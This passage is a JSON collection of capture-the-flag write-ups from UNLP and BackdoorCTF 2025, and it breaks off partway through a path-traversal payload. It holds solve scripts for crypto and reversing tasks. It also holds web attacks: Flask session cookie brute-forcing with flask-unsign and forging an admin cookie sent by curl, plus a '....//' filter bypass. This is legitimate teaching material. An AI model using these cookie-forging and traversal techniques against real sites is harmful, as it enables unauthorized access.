                "writeup": "<h3>1. Initial Analysis</h3>\n<p>We were provided with a file named <code>script.cpython-312.pyc</code>. The extension <code>.pyc</code> indicates this is a <strong>compiled Python bytecode file</strong>, meaning it is not human-readable source code but rather the intermediate bytecode that the Python interpreter executes.</p>\n<p>To understand the logic, we needed to decompile it back into readable Python source code.</p>\n<h3>2. Decompilation</h3>\n<p>Since <code>.pyc</code> files contain bytecode, we used an online decompiler tool to reverse the compilation process.</p>\n<ul>\n<li><strong>Tool Used:</strong> <a href=\"https://pylingual.io\" target=\"_blank\">pylingual.io</a></li>\n</ul>\n<ul>\n<li><strong>Action:</strong> Uploaded <code>script.cpython-312.pyc</code>.</li>\n</ul>\n<ul>\n<li><strong>Result:</strong> Recovered the original source code, revealing the logic for password validation and AES decryption.</li>\n</ul>\n<h3>3. Code Analysis</h3>\n<p>The decompiled script revealed two main components: a password checker and a decryption function.</p>\n<h4>The Password Checker</h4>\n<p>The script prompts for a password (<code>s</code>) and validates it using the <code>check(s)</code> function:</p>\n<p>Python</p>\n<pre><code class=\"\">\ny = 's4Pd'\n\n\n\ndef check(s):\n\n    z = '0w5' + y + 'r'                 # Constructs target string z\n\n    x = (s[6:8] + s[0:3] + s[3:6])[::-1]  # Shuffles and reverses input s\n\n    return x == z\n\n</code></pre>\n<ul>\n<li><strong>Target Construction (<code>z</code>):</strong> The variable <code>y</code> is <code>'s4Pd'</code>. <code>z</code> is constructed as <code>'0w5' + 's4Pd' + 'r'</code>, resulting in: <code>z = '0w5s4Pdr'</code></li>\n</ul>\n<ul>\n<li><strong>Input Transformation (<code>x</code>):</strong> The input <code>s</code> is sliced into three parts, reordered, and then the entire string is reversed. To pass the check, the transformed input <code>x</code> must match <code>z</code>.</li>\n</ul>\n<h4>The Decryption Routine</h4>\n<p>If the password is correct, the script uses it to decrypt a hidden hex string:</p>\n<p>Python</p>\n<pre><code class=\"\">\ndef get_secret(k):\n\n    # ... (hex string) ...\n\n    key = (k * 2).encode('utf-8')        # Key is password repeated twice\n\n    iv = b'thisIsNotTheFlag'             # Hardcoded IV\n\n    aes = AES.new(key, AES.MODE_CBC, iv)\n\n    return aes.decrypt(secret)\n\n</code></pre>\n<h3>4. Solving the Logic</h3>\n<p>To find the correct password, we reversed the operations performed in the <code>check(s)</code> function:</p>\n<ol>\n<li><strong>Target String:</strong> <code>'0w5s4Pdr'</code></li>\n</ol>\n<ol>\n<li><strong>Reverse It:</strong> The code does <code>[::-1]</code>, so we reverse <code>z</code> to get the pre-reversed state: <code>'rdP4s5w0'</code></li>\n</ol>\n<ol>\n<li><strong>Un-shuffle:</strong> The code arranged the input as <code>Index[6:8] + Index[0:3] + Index[3:6]</code>. We map the reversed string back to these slots:</li>\n</ol>\n<ul>\n<li><code>s[6:8]</code> (Last 2 chars) = <code>'rd'</code></li>\n</ul>\n<ul>\n<li><code>s[0:3]</code> (First 3 chars) = <code>'P4s'</code></li>\n</ul>\n<ul>\n<li><code>s[3:6]</code> (Middle 3 chars) = <code>'5w0'</code></li>\n</ul>\n<p>combining these in order (<code>0-3</code>, <code>3-6</code>, <code>6-8</code>) gave us the password: <strong><code>P4s5w0rd</code></strong>.</p>\n<h3>5. Capturing the Flag</h3>\n<p>With the password recovered, we had two options: run the script or write a solver. We ran the script and provided the input:</p>\n<p>Plaintext</p>\n<pre><code class=\"\">\nPassword: P4s5w0rd\n\n</code></pre>\n<p>The script successfully authenticated the user and decrypted the AES string using the derived key.</p>\n<p><strong>Final Flag:</strong> <code>UNLP{w3lc0m3-B4by-R3vers3r}</code></p>"
            },
            {
                "id": "weird-pcap",
                "title": "Weird PCAP",
                "category": "Miscellaneous",
                "tags": [
                    "reverse",
                    "pcap",
                    "shark"
                ],
                "writeup": "<h3>Analysis</h3>\n<p>We started by analyzing the provided capture file <code>weird.pcap</code>. A protocol hierarchy check (<code>tshark -z io,phs</code>) revealed significant DNS traffic.</p>\n<p>Inspecting the DNS queries specifically:</p>\n<pre><code class=\"bash\">\ntshark -r weird.pcap -Y dns -T fields -e dns.qry.name\n\n</code></pre>\n<p>We observed a series of suspicious reverse DNS lookup (PTR) queries in the format <code>&lt;IP&gt;.in-addr.arpa</code>:</p>\n<pre><code class=\"\">\n85.78.76.80.in-addr.arpa\n\n123.67.48.118.in-addr.arpa\n\n51.114.84.95.in-addr.arpa\n\n95.99.104.52.in-addr.arpa\n\n110.78.101.124.in-addr.arpa\n\n95.85.115.49.in-addr.arpa\n\n110.103.95.68.in-addr.arpa\n\n78.83.33.33.in-addr.arpa\n\n125.192.180.219.in-addr.arpa\n\n</code></pre>\n<h3>Decoding</h3>\n<p>The \"IP addresses\" being queried appeared to be carriers for the flag data rather than legitimate network addresses. We extracted the octets from the IPs and converted them to ASCII.</p>\n<p>For example, the first IP <code>85.78.76.80</code>:</p>\n<ul>\n<li>85 -> U</li>\n<li>78 -> N</li>\n<li>76 -> L</li>\n<li>80 -> P</li>\n</ul>\n<p>Proceeding with the full list:</p>\n<ol>\n<li>85.78.76.80     -> UNLP</li>\n<li>123.67.48.118   -> {C0v</li>\n<li>51.114.84.95    -> 3rT_</li>\n<li>95.99.104.52    -> _ch4</li>\n<li>110.78.101.124  -> nNe|</li>\n<li>95.85.115.49    -> _Us1</li>\n<li>110.103.95.68   -> ng_D</li>\n<li>78.83.33.33     -> NS!!</li>\n<li>125...          -> } (plus padding/noise)</li>\n</ol>\n<h3>Flag</h3>\n<p>Concatenating the decoded segments reveals the flag:</p>\n<p><code>UNLP{C0v3rT__ch4nNe|_Us1ng_DNS!!}</code></p>"
            },
            {
                "id": "xtrings",
                "title": "Xtrings",
                "category": "Beginner",
                "tags": [
                    "xor"
                ],
                "writeup": "<ol>\n<li><strong>Initial Analysis:</strong></li>\n</ol>\n<p>The provided file was <code>windows_app.exe.xor</code>. The <code>.xor</code> extension suggested XOR encryption, and <code>windows_app.exe</code> indicated it was likely a Windows executable.</p>\n<ol>\n<li><strong>Determining the XOR Key:</strong></li>\n</ol>\n<p>Windows executables typically start with the \"MZ\" magic bytes (0x4D 0x5A). I inspected the first few bytes of <code>windows_app.exe.xor</code> using <code>head -c 32 windows_app.exe.xor | xxd</code>.     The first bytes were <code>09 15 c3 44 4c 53 44 4f...</code>     By XORing the first two bytes of the encrypted file with the expected \"MZ\" bytes, I tried to deduce the key:     <code>0x09 ^ 0x4D = 0x44</code>     <code>0x15 ^ 0x5A = 0x4F</code>     This suggested the key might start with <code>0x44 0x4F</code> (ASCII \"DO\").     Further analysis of the next byte, <code>0xc3</code>, against the expected <code>0x90</code> (common after MZ for the DOS stub), led to:     <code>0xc3 ^ 0x90 = 0x53</code> (ASCII \"S\").     This led to the hypothesis that the repeating XOR key was \"DOS\" (<code>0x44 0x4F 0x53</code>).     Applying this key to the first few bytes:     <code>09 ^ 44 = 4D ('M')</code>     <code>15 ^ 4F = 5A ('Z')</code>     <code>C3 ^ 53 = 90</code>     <code>44 ^ 44 = 00</code>     This matched the expected pattern for a DOS executable header.</p>\n<ol>\n<li><strong>Decryption:</strong></li>\n</ol>\n<p>A Python script (<code>decrypt.py</code>) was created to perform the XOR decryption using the repeating key \"DOS\".     ```python     def xor_file(input_path, output_path, key):         key_bytes = key.encode('ascii')         key_len = len(key_bytes)</p>\n<p>with open(input_path, 'rb') as f_in, open(output_path, 'wb') as f_out:             chunk_size = 4096             offset = 0             while True:                 chunk = f_in.read(chunk_size)                 if not chunk:                     break</p>\n<p>decrypted_chunk = bytearray(len(chunk))                 for i in range(len(chunk)):                                                                     decrypted_chunk[i] = chunk[i] ^ key_bytes[(offset + i) % key_len]</p>\n<p>f_out.write(decrypted_chunk)                 offset += len(chunk)                                                                                                                                                        if __name__ == \"__main__\":         xor_file(\"windows_app.exe.xor\", \"windows_app.exe\", \"DOS\")         print(\"Decryption complete.\")     ``<code>     The script was executed, generating the decrypted </code>windows_app.exe` file.</p>\n<ol>\n<li><strong>Flag Extraction:</strong></li>\n</ol>\n<p>Given the challenge name \"xtrings\", it was highly probable the flag was present as a string within the executable. The <code>strings</code> utility was used in conjunction with <code>grep</code> to search for common flag patterns:     <code>strings windows_app.exe | grep -i \"flag\"</code>     This command revealed the flag.</p>\n<p><strong>Flag:</strong> <code>UNLP{X0R_4nD_str1nG5}</code></p>"
            },
            {
                "id": "crackme",
                "title": "crackme",
                "category": "Miscellaneous",
                "tags": [
                    "buffer",
                    "stack",
                    "reverse",
                    "assembly",
                    "crack"
                ],
                "writeup": "<h3>Tools Used</h3>\n<ul>\n<li><code>file</code>: To identify the type of the executable.</li>\n<li><code>strings</code>: To extract printable strings from the binary.</li>\n<li><code>objdump</code>: To disassemble the executable and inspect its sections.</li>\n</ul>\n<h3>Analysis Steps</h3>\n<h4>1. Initial Reconnaissance</h4>\n<p>First, I used <code>file</code> to determine the executable's type:</p>\n<pre><code class=\"bash\">\nfile crackme\n\n# Output: crackme: ELF 64-bit LSB pie executable, x86-64, ... not stripped\n\n</code></pre>\n<p>The output indicated it was a 64-bit ELF executable and, crucially, \"not stripped\", meaning symbol information was still present, which simplifies reverse engineering.</p>\n<p>Next, I ran <code>strings</code> to look for any immediately obvious clues, such as hardcoded passwords, error messages, or flag formats.</p>\n<pre><code class=\"bash\">\nstrings crackme | head -n 20\n\n</code></pre>\n<p>This revealed several interesting strings:</p>\n<ul>\n<li>\"Enter your username:\"</li>\n<li>References to OpenSSL functions like <code>EVP_DigestInit_ex</code>, <code>EVP_sha256</code>, <code>EVP_DigestUpdate</code>, <code>EVP_DigestFinal_ex</code>. This immediately suggested that a SHA-256 hash calculation was involved.</li>\n</ul>\n<h4>2. Disassembly and Logic Flow</h4>\n<p>Given the SHA-256 references, the next step was to disassemble the <code>main</code> function using <code>objdump</code> to understand the program's logic flow.</p>\n<pre><code class=\"bash\">\nobjdump -d -M intel --no-show-raw-insn crackme | grep -A 50 \"&lt;main&gt;:\"\n\n</code></pre>\n<p>The disassembly revealed a two-stage authentication process:</p>\n<h5>Stage 1: Username Check</h5>\n<p>The program first prompts for a username. It then compares this input using <code>strcmp</code> against a hardcoded string. If the username is incorrect, the program exits. The target username was found by inspecting the address referenced by the <code>strcmp</code> call (e.g., <code>lea rax,[rip+0xc24] # 205a &lt;k4+0x3a&gt;</code>). By examining the <code>.rodata</code> section at <code>0x205a</code>, the username was identified as:</p>\n<pre><code class=\"\">\n# From objdump -s -j .rodata crackme\n\n...\n\n 2050 726e616d 65006164 6d696e00   username.admin.\n\n...\n\n</code></pre>\n<p>The username required is <code>admin</code>.</p>\n<h5>Stage 2: Password Hash Check</h5>\n<p>After a successful username entry, the program prompts for a \"password\". This input is then passed to a function <code>compute_sha256</code> (which uses the OpenSSL functions identified earlier). The resulting SHA-256 hash (32 bytes) is then compared using <code>memcmp</code> against a hardcoded 32-byte value stored on the stack.</p>\n<p>The hardcoded target hash was constructed from four 8-byte (QWORD) values, <code>k1</code>, <code>k2</code>, <code>k3</code>, and <code>k4</code>, loaded from the <code>.rodata</code> section into a stack buffer at the beginning of the <code>main</code> function.</p>\n<p>To retrieve the complete 32-byte hash, the <code>.rodata</code> section was dumped:</p>\n<pre><code class=\"bash\">\nobjdump -s -j .rodata crackme\n\n</code></pre>\n<p>The relevant bytes were found concatenated from <code>0x2008</code>:</p>\n<ul>\n<li><code>k1</code> (at <code>0x2008</code>): <code>fcf730b6d95236ec</code></li>\n<li><code>k2</code> (at <code>0x2010</code>): <code>d3c9fc2d92d7b6b2</code></li>\n<li><code>k3</code> (at <code>0x2018</code>): <code>bb061514961aec04</code></li>\n<li><code>k4</code> (at <code>0x2020</code>): <code>1d6c7a7192f592e4</code></li>\n</ul>\n<p>Concatenating these bytes (in hex format) yielded the target SHA-256 hash: <code>fcf730b6d95236ecd3c9fc2d92d7b6b2bb061514961aec041d6c7a7192f592e4</code></p>\n<h4>3. Solution</h4>\n<p>The username is <code>admin</code>. The target SHA-256 hash is <code>fcf730b6d95236ecd3c9fc2d92d7b6b2bb061514961aec041d6c7a7192f592e4</code>.</p>\n<p>The user provided the plaintext password <code>secret123</code> which hashes to this value.</p>\n<h3>The Flag</h3>\n<p>By entering <code>admin</code> as the username and <code>secret123</code> as the password, the program would accept the input. The flag format is <code>UNLP{&lt;password&gt;}</code>.</p>\n<p>Therefore, the flag is: <code>UNLP{secret123}</code></p>"
            },
            {
                "id": "qrcodes",
                "title": "qrcodes",
                "category": "Miscellaneous",
                "tags": [],
                "writeup": "<p>Works if you scan the qr on Phones</p>\n<h3>Flag: <code>UNLP{DualQR_C0d3s_4r3_Aw3s0m3!}</code></h3>"
            }
        ]
    },
    "BackdoorCTF 2025": {
        "rank": "79th place",
        "description": "Advanced competition featuring challenging pwn and reverse engineering problems.",
        "challenges": [
            {
                "id": "ambystoma-mexicanum",
                "title": "Ambystoma Mexicanum",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "aes",
                    "cipher"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We're given a cryptographic service that uses AES-GCM-SIV encryption. The goal is to make the service output the flag by crafting a ciphertext that, when decrypted with multiple keys, produces the message \"gib me flag plis\".</p>\n<h3>Initial Analysis</h3>\n<p>Looking at the challenge code, the service provides several options:</p>\n<ol>\n<li>Rotate key (generates a new random key)</li>\n<li>Debug (shows keys, ciphertexts, and nonce)</li>\n<li>Push ciphertext (allows us to submit one ciphertext)</li>\n<li>Request flag (attempts to verify our message)</li>\n</ol>\n<h4>The Flag Request Logic</h4>\n<p>The critical part of the code is in option 4:</p>\n<pre><code class=\"python\">\nfor i in range(4):\n\n    key = binascii.unhexlify(KEYS[i % len(KEYS)])\n\n    ct = binascii.unhexlify(CIPHERTEXTS[i % len(CIPHERTEXTS)])\n\n\n\n    text = service.decrypt(ct, key)[16 * i:16 * (i+1)].decode('utf-8').strip()\n\n\n\n    if not text or len(text) == 0:\n\n        print(\"why so rude :(\\n\")\n\n        exit(0)\n\n\n\n    usertext += text\n\n\n\nif usertext == REQUEST:  # REQUEST = \"gib me flag plis\"\n\n    print(f\"Damn, you are something. Here is the flag: {FLAG}\\n\")\n\n</code></pre>\n<p>This code:</p>\n<ol>\n<li>Loops 4 times</li>\n<li>Uses modulo to cycle through available keys and ciphertexts</li>\n<li>Decrypts the ciphertext with each key</li>\n<li>Extracts a different 16-byte slice from each decryption: <code>[0:16]</code>, <code>[16:32]</code>, <code>[32:48]</code>, <code>[48:64]</code></li>\n<li>Strips whitespace and concatenates all chunks</li>\n<li>Checks if the result equals \"gib me flag plis\"</li>\n</ol>\n<h3>Finding the Vulnerability</h3>\n<h4>Initial Thoughts</h4>\n<p>At first glance, this seems impossible. With 4 different keys, you'd need:</p>\n<ul>\n<li>A ciphertext that decrypts successfully with all 4 keys (AES-GCM-SIV has authentication!)</li>\n<li>Each decryption producing the right bytes at the right positions</li>\n</ul>\n<h4>The Key Insight</h4>\n<p>The breakthrough comes from understanding the modulo operators:</p>\n<ul>\n<li><code>KEYS[i % len(KEYS)]</code> - cycles through available keys</li>\n<li><code>CIPHERTEXTS[i % len(CIPHERTEXTS)]</code> - cycles through available ciphertexts</li>\n</ul>\n<p><strong>If we DON'T rotate the key</strong>, <code>len(KEYS)</code> remains 1, meaning:</p>\n<ul>\n<li><code>KEYS[0 % 1] = KEYS[0]</code></li>\n<li><code>KEYS[1 % 1] = KEYS[0]</code></li>\n<li><code>KEYS[2 % 1] = KEYS[0]</code></li>\n<li><code>KEYS[3 % 1] = KEYS[0]</code></li>\n</ul>\n<p>All iterations use the <strong>same key</strong>! And with one ciphertext, all iterations use the <strong>same ciphertext</strong> too!</p>\n<h3>The Solution Strategy</h3>\n<p>Since all iterations use the same key and ciphertext, we just need to:</p>\n<ol>\n<li>Create a 64-byte plaintext</li>\n<li>Position our target message so each 16-byte extraction gives us the right part</li>\n<li>Encrypt it with the single key</li>\n<li>Handle the <code>.strip()</code> method carefully</li>\n</ol>\n<h4>Handling <code>.strip()</code></h4>\n<p>The tricky part is that <code>.strip()</code> removes <strong>all leading and trailing whitespace</strong>. The target message is \"gib me flag plis\" (16 characters with spaces between words).</p>\n<p>If we split it as: \"gib \" + \"me \" + \"flag \" + \"plis\", the <code>.strip()</code> will remove trailing spaces, giving us \"gibmeflagplis\" (no spaces).</p>\n<p><strong>Solution</strong>: Split the message so spaces are in the MIDDLE of chunks, where <code>.strip()</code> won't touch them:</p>\n<ul>\n<li>Chunk 0 [0:16]: \"gib m\" (5 chars) + padding</li>\n<li>Chunk 1 [16:32]: \"e fla\" (5 chars) + padding</li>\n<li>Chunk 2 [32:48]: \"g pli\" (5 chars) + padding</li>\n<li>Chunk 3 [48:64]: \"s\" (1 char) + padding</li>\n</ul>\n<p>After <code>.strip()</code> and concatenation: \"gib m\" + \"e fla\" + \"g pli\" + \"s\" = \"gib me flag plis\" \u2713</p>\n<h3>Exploit Code</h3>\n<pre><code class=\"python\">\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCMSIV\n\nimport binascii\n\n\n\n# Get key and nonce from debug option (don't rotate keys!)\n\nKEY_HEX = \"b2e12b64da4c319a037ea801ed0b1eda\"\n\nNONCE_HEX = \"358cef8f8b551be7b1a3ce2d\"\n\n\n\nTARGET = \"gib me flag plis\"\n\n\n\nkey = binascii.unhexlify(KEY_HEX)\n\nnonce = binascii.unhexlify(NONCE_HEX)\n\naead = b\"\"\n\n\n\n# Create plaintext with spaces in the middle of chunks\n\nplaintext = b'gib m           '  # -&gt; \"gib m\"\n\nplaintext += b'e fla           '  # -&gt; \"e fla\"\n\nplaintext += b'g pli           '  # -&gt; \"g pli\"\n\nplaintext += b's               '  # -&gt; \"s\"\n\n\n\n# Encrypt\n\ncipher = AESGCMSIV(key)\n\nciphertext = cipher.encrypt(nonce, plaintext, aead)\n\n\n\nprint(f\"Ciphertext: {ciphertext.hex()}\")\n\n</code></pre>\n<h3>Exploitation Steps</h3>\n<ol>\n<li>Connect to the service: <code>nc remote.infoseciitr.in 4004</code></li>\n<li><strong>DON'T</strong> choose option 1 (don't rotate keys!)</li>\n<li>Choose option 2 (debug) to get the initial key and nonce</li>\n<li>Run the exploit script with the key and nonce</li>\n<li>Choose option 3 and paste the generated ciphertext</li>\n<li>Choose option 4 to get the flag!</li>\n</ol>\n<h3>Key Takeaways</h3>\n<ol>\n<li><strong>Modulo arithmetic matters</strong>: The use of <code>% len(KEYS)</code> meant we could bypass the multi-key requirement entirely</li>\n<li><strong>Read the code carefully</strong>: The vulnerability wasn't in the crypto itself, but in how the keys were managed</li>\n<li><strong>String manipulation edge cases</strong>: Understanding exactly how <code>.strip()</code> works was crucial for crafting the right plaintext</li>\n<li><strong>Sometimes the simple solution works</strong>: Instead of trying to break AES-GCM-SIV with nonce reuse, the real solution was to avoid using multiple keys at all</li>\n</ol>\n<h3>Flag</h3>\n<pre><code class=\"\">\nflag{th3_4x0lo7ls_4r3_n07_wh47_th3y_s33m}\n\n</code></pre>"
            },
            {
                "id": "bolt-fast",
                "title": "Bolt Fast",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "rsa",
                    "cipher"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We are given a modified RSA implementation with the following files:</p>\n<ul>\n<li><code>chall.py</code>: The key generation and encryption code</li>\n<li><code>output.txt</code>: The public key (N, e) and ciphertext (c)</li>\n</ul>\n<p>Flag: <code>flag{w31n3r_d1dn7_73ll_y0u_70_b3_6r33dy}</code></p>\n<h3>Vulnerability Analysis</h3>\n<p>Looking at the key generation code in <code>chall.py</code>:</p>\n<pre><code class=\"python\">\ndef flash_key():\n\n    while True:\n\n        p = getPrime(1024)\n\n        q = getPrime(1024)\n\n        N = p * q\n\n        dp_smart = getPrime(16)  # Only 16 bits!\n\n        try:\n\n            e = inverse(dp_smart, p-1)\n\n            return N, e, dp_smart\n\n        except ValueError:\n\n            continue\n\n</code></pre>\n<p>The vulnerability is clear: <code>dp_smart</code> is only a 16-bit prime (maximum value ~65536).</p>\n<p>The relationship is: <code>e * dp \u2261 1 (mod p-1)</code></p>\n<p>This means: <code>e * dp = 1 + k * (p-1)</code> for some integer k</p>\n<p>Rearranging: <code>p = (e * dp - 1) / k + 1</code></p>\n<h3>Attack Strategy</h3>\n<p>Since dp is so small (only 16 bits), we can brute force it:</p>\n<ol>\n<li>Iterate through all 16-bit primes for dp (roughly 6,500 primes)</li>\n<li>For each dp, compute <code>e * dp - 1</code></li>\n<li>Try different values of k to find when <code>(e * dp - 1) / k + 1</code> gives us a valid factor of N</li>\n<li>Once we find p, compute q = N / p</li>\n<li>Calculate the private key d and decrypt the message</li>\n</ol>\n<h3>Solution Code</h3>\n<pre><code class=\"python\">\nfrom Crypto.Util.number import long_to_bytes, isPrime\n\n\n\nN = 22061149554706951873851465765917042279909309233484615798640186468876401527123242297915465375459511054772541825273007749026648641620485458471351811298443479262277231839408201654282927999029324652496830649919637863202844794784443579336735415046336390091671003022244732389217910334465895328371360158510046347031294125509649474722535171601096998732929497780870057433634214228116293166963101489644680801538837005001377764416442380530464289453201654394144682138927826247301956954884930328147978637795259346321547054237005318172528896865428457293207571804464061990459958593520373578234234490804585522859401957032395007142007\n\ne = 9648003423571638489624579625383119603270189664714210175737275695548206153582516635644990660189908448510652756058045483763071850222529184219333877863638216254054444012130393864033392161426815671725858723096432660521038315432183692553568344247916320931122090436770154203149432285380142051084178668290839858171\n\nc = 18817014323644102879407569381912044887671193778381872592373573382139976320220125847317309926920208859012582031032930373240219755720268543444729983316326640661427616841700761054678137741340093140586895094016730198447552611014038632666821117758006775144046000049080406858764900680265384743839472653817299383323869146152251839342236631780818396088131196202767951301023089053662813175083035336272981588533957561537975684034210166185396046071368061264321959248372783262788158418696375783427276741258526067168910326630496339287237940444426277757582174810909733937257258767407189452212391936958267819666424558678534741723930\n\n\n\nprint(\"Brute forcing 16-bit dp values...\")\n\n\n\nfor dp in range(2, 65536):\n\n    if not isPrime(dp):\n\n        continue\n\n    \n\n    edp_minus_1 = e * dp - 1\n\n    \n\n    for k in range(1, 100000):\n\n        if edp_minus_1 % k != 0:\n\n            continue\n\n        \n\n        p_minus_1 = edp_minus_1 // k\n\n        p = p_minus_1 + 1\n\n        \n\n        if p &gt; 1 and p &lt; N and N % p == 0:\n\n            q = N // p\n\n            \n\n            if p * q == N:\n\n                print(f\"Found: dp={dp}, k={k}\")\n\n                \n\n                phi = (p - 1) * (q - 1)\n\n                d = pow(e, -1, phi)\n\n                m = pow(c, d, N)\n\n                flag = long_to_bytes(m)\n\n                \n\n                print(f\"FLAG: {flag.decode()}\")\n\n                exit()\n\n</code></pre>"
            },
            {
                "id": "flask-of-cookies",
                "title": "Flask Of Cookies",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "http",
                    "flask",
                    "cookie",
                    "reverse",
                    "crack"
                ],
                "writeup": "<h3>Challenge Description</h3>\n<p>A web exploitation challenge involving a Flask application where the goal is to gain administrative access to retrieve a flag.</p>\n<h3>Analysis</h3>\n<h4>Source Code Review</h4>\n<p>The provided <code>app.py</code> reveals the core logic:</p>\n<pre><code class=\"python\">\ndef derived_level(sess, secret_key):\n\n    user = sess.get(\"user\", \"\")\n\n    role = sess.get(\"role\", \"\")\n\n    if role == \"admin\" and user == secret_key[::-1]:\n\n        return \"superadmin\"\n\n    return \"user\"\n\n\n\n@app.route(\"/admin\")\n\ndef admin():\n\n    level = derived_level(session, app.secret_key)\n\n    if level == \"superadmin\":\n\n        return render_template(\"admin.html\", flag=flag_value)\n\n    return \"Access denied.\\n\", 403\n\n</code></pre>\n<p>To get the flag, we need to satisfy two conditions in our session:</p>\n<ol>\n<li><code>role</code> must be set to <code>\"admin\"</code>.</li>\n<li><code>user</code> must be the <strong>reverse</strong> of the server's <code>SECRET_KEY</code>.</li>\n</ol>\n<h4>The Problem</h4>\n<p>The <code>SECRET_KEY</code> is loaded from the environment variables. The local <code>.env</code> file provided in the download contained a placeholder (<code>&lt;fake_secret_key&gt;</code>), which does not work on the remote server.</p>\n<p>There was a misleading string in the EXIF data of <code>static/cookie.jpg</code> (<code>fPCwmvV/0a2Rul8RgRsZdaiP8Pfn1EvJXXrJLvSwmAM=</code>), but this turned out to be a rabbit hole (or a hash of a key we couldn't easily crack).</p>\n<h3>Exploitation</h3>\n<h4>1. Obtaining the Secret Key</h4>\n<p>Since we have a valid session cookie from the server (by visiting the homepage), and the server is likely using a weak secret key, we can attempt to brute-force it using <code>flask-unsign</code>.</p>\n<p><strong>Command:</strong></p>\n<pre><code class=\"bash\">\nflask-unsign --unsign --cookie \"&lt;server_cookie&gt;\" --wordlist /usr/share/wordlists/rockyou.txt\n\n</code></pre>\n<p><strong>Result:</strong> The tool successfully cracks the signature and reveals the secret key: <code>qwertyuiop</code>.</p>\n<h4>2. Forging the Admin Cookie</h4>\n<p>With the secret key (<code>qwertyuiop</code>), we can now forge a valid session cookie that satisfies the exploit conditions.</p>\n<ul>\n<li><strong>Secret Key:</strong> <code>qwertyuiop</code></li>\n<li><strong>Target Role:</strong> <code>admin</code></li>\n<li><strong>Target User:</strong> <code>poiuytrewq</code> (The secret key reversed)</li>\n</ul>\n<p><strong>Forge Script:</strong></p>\n<pre><code class=\"python\">\nfrom flask.sessions import SecureCookieSessionInterface\n\nfrom flask import Flask\n\n\n\napp = Flask(__name__)\n\napp.secret_key = \"qwertyuiop\"\n\n\n\nsession_interface = SecureCookieSessionInterface()\n\nserializer = session_interface.get_signing_serializer(app)\n\n\n\nsession_data = {\"user\": \"poiuytrewq\", \"role\": \"admin\"}\n\ncookie_val = serializer.dumps(session_data)\n\n\n\nprint(f\"Forged Cookie: {cookie_val}\")\n\n</code></pre>\n<h4>3. Retrieving the Flag</h4>\n<p>We send the forged cookie to the <code>/admin</code> endpoint.</p>\n<p><strong>Command:</strong></p>\n<pre><code class=\"bash\">\ncurl -H \"Cookie: session=&lt;forged_cookie&gt;\" http://104.198.24.52:6011/admin\n\n</code></pre>\n<p><strong>Response:</strong> The server accepts the cookie as valid superadmin credentials and returns the page containing the flag.</p>\n<h3>Flag</h3>\n<pre><code class=\"\">\nflag{y0u_l34rn3ed_flask_uns1gn_c0ok1e}\n\n</code></pre>"
            },
            {
                "id": "fractonacci",
                "title": "Fractonacci",
                "category": "Forensics",
                "tags": [
                    "image"
                ],
                "writeup": "<h3>Challenge Description</h3>\n<p>\"Beautiful. Red. Fractonacci. What could this mean??\" We are provided with an image <code>fractonacci.png</code>.</p>\n<h3>Solution</h3>\n<ol>\n<li><strong>Analysis</strong>:</li>\n</ol>\n<ul>\n<li>The image is a large PNG (6000x6000).</li>\n<li>The name \"Fractonacci\" suggests a connection to Fractals and Fibonacci numbers.</li>\n<li>The hint \"Red\" suggests looking at the Red color channel.</li>\n</ul>\n<ol>\n<li><strong>Extraction</strong>:</li>\n</ol>\n<ul>\n<li>We extracted the Red channel data from the image.</li>\n<li>Using <code>imagemagick</code>:</li>\n</ul>\n<p>``<code>bash      convert challenge.png -channel R -separate -depth 8 red.gray      </code>``</p>\n<ol>\n<li><strong>Decoding</strong>:</li>\n</ol>\n<ul>\n<li>We wrote a Python script to analyze the raw bytes of the Red channel (<code>red.gray</code>).</li>\n<li>Following the \"Fibonacci\" hint, we examined the byte values at indices corresponding to the Fibonacci sequence (1, 2, 3, 5, 8, 13, ...).</li>\n<li>The sequence $F_n$ where $F_0=0, F_1=1, F_{n}=F_{n-1}+F_{n-2}$.</li>\n<li>We extracted bytes at indices: 1, 2, 3, 5, 8, 13, 21, ...</li>\n</ul>\n<ol>\n<li><strong>Result</strong>:</li>\n</ol>\n<ul>\n<li>The extracted characters formed the string: <code>lag{n3wt0n_fr4c74l5_4r3_b34u71ful}</code>.</li>\n<li>Prepending the missing 'f' (which would correspond to a theoretical earlier index or just implied), we get the complete flag.</li>\n</ul>\n<h3>Flag</h3>\n<p><code>flag{n3wt0n_fr4c74l5_4r3_b34u71ful}</code></p>"
            },
            {
                "id": "image-gallery",
                "title": "Image Gallery",
                "category": "Web Exploitation",
                "tags": [
                    "rsa",
                    "http",
                    "image"
                ],
                "writeup": "<p>Analysis:</p>\n<ol>\n<li><strong>Source Code Review</strong>: The challenge provides a source code archive (<code>gallery.zip</code>). Analyzing <code>server.js</code>, we find an express server with an endpoint <code>/image</code>.</li>\n<li><strong>Vulnerable Endpoint</strong>: The <code>/image</code> endpoint takes a <code>file</code> query parameter to serve images from the <code>images</code> directory (<code>BASE_DIR</code>).</li>\n</ol>\n<p>``<code>javascript     const BASE_DIR = path.join(__dirname, 'images');     // ...     app.get('/image', (req, res) =&gt; {       let file = req.query.file || '';       // ...       file = file.replace(/\\\\/g, '/');       file = file.split('../').join(''); // Vulnerable sanitization       const resolved = path.join(BASE_DIR, file);       // ...       fs.readFile(resolved, (err, data) =&gt; { ... });     });     </code>``</p>\n<ol>\n<li><strong>Sanitization Flaw</strong>: The code attempts to prevent path traversal by removing <code>../</code> using <code>split('../').join('')</code>. However, this is not recursive. It effectively removes all occurrences of <code>../</code> present *initially*, but does not check if new <code>../</code> sequences are formed *after* the removal.</li>\n</ol>\n<p>Exploit:</p>\n<ol>\n<li><strong>Bypassing the Filter</strong>: If we send the string <code>....//</code>, the code splits it by <code>../</code>.</li>\n</ol>\n<ul>\n<li><code>\"....//\".split('../')</code> results in <code>[\"..\", \"/\"]</code>.</li>\n<li>Joining them back together results in <code>../</code>.</li>\n</ul>\n<ol>\n<li><strong>Target File</strong>: The file structure shows a <code>secret</code> directory at the same level as <code>images</code>.</li>\n</ol>\n<ul>\n<li><code>gallery/images/</code> (Base Directory)</li>\n<li><code>gallery/secret/flag.txt</code></li>\n</ul>\n<ol>\n<li><strong>Payload</strong>: To access <code>../secret/flag.txt</code>, we can use 